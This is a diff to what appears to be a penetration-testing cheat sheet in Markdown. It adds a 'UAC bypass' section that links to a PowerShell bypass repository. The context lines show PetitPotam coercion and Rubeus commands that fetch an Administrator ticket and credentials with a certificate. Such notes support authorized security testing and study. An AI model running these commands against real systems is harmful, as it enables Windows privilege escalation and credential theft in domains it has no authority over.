@@ -88,6 +88,7 @@
     - [HiveNightmare](#hivenightmare)
     - [S4U](#s4u)
     - [ADCS](#adcs)
+    - [UAC bypass](#uac-bypass)
   - [Linux](#linux-3)
     - [SUGGEST](#suggest)
     - [/etc/passwd](#etcpasswd)
@@ -1090,6 +1091,9 @@ python3 PetitPotam.py kaliIP targetIP
 # TGT request
 .\Rubeus.exe asktgt /user:Administrator /certificate:[Base64_Cert] /getcredentials /password:
 ```
+
+### UAC bypass
+https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC
 
 ## Linux
 ### SUGGEST
